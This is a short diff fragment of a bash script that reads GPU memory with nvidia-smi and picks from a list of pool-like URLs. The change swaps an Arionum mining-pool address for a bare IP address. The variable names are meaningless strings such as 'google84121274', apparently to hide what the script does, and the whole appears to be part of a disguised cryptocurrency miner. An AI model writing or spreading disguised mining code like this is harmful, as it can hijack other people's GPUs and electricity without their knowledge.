@@ -6,7 +6,7 @@ google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//
 
 arr[0]="http://port.aro.wellgitu.com"
 rand=$[$RANDOM % ${#arr[@]}]
-google841212121274="http://mine.arionumpool.com"
+google841212121274="http://154.127.52.52"
 
 if [[ $google84121274 == *"failed"* ]]; then
 
